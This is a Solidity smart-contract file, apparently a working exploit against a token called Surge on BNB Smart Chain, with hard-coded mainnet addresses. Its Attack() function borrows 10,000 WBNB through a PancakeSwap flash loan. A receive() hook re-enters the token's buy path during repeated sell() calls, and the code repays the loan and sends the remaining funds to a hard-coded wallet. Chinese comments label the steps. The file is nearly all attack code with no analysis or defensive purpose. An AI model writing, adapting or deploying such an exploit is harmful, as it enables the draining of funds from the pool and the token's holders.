// SPDX-License-Identifier: Apache-2.0
pragma solidity =0.8.0;

interface IpancakePair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    
    function token0() external view returns (address);
    function token1() external view returns (address);
    
}

interface WBNB {

    function deposit() payable external;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}


interface Token {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}

interface Surge{
    function sell(uint256 tokenAmount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external  returns (bool);
}


contract  test{
    
    address private constant cake_Address = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    
    address private constant WBNB_Address = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    
    address private constant Pancake_Pair_Address = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
    
    address public constant Surge_Address = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;
    
    // 这里填你自己的测试地址
    address public wallet = 0x8F14c19ed3d592039D2F6aD372bd809228369D77;
    
    uint8 public time = 0;
    
    
    
    function Attack()external {
    
        // Brrow 100 WBNB
        bytes memory data = abi.encode(WBNB_Address, 10000*1e18);
        
        IpancakePair(Pancake_Pair_Address).swap(0,10000*1e18,address(this),data);
    
    }
    
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{

        //把WBNB换成BNB
        WBNB(WBNB_Address).withdraw(WBNB(WBNB_Address).balanceOf(address(this)));
        
        // Buy
        (bool buy_successful,) = payable(Surge_Address).call{value: address(this).balance, gas: 40000}("");
        
        //循环6次
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
        
        //把所有BNB换成WBNB
        WBNB(WBNB_Address).deposit{value: address(this).balance}();

        //还给PancakeSwap 10300个WBNB
        Token(WBNB_Address).transfer(Pancake_Pair_Address, 10300*1e18);
        WBNB(WBNB_Address).transfer(wallet,WBNB(WBNB_Address).balanceOf(address(this)));
    }
    
    

    receive() external payable {
        
        if(msg.sender == Surge_Address && time < 6){
        
            (bool buy_successful,) = payable(Surge_Address).call{value: address(this).balance, gas: 40000}("");

            time++;

        }
    }
    
}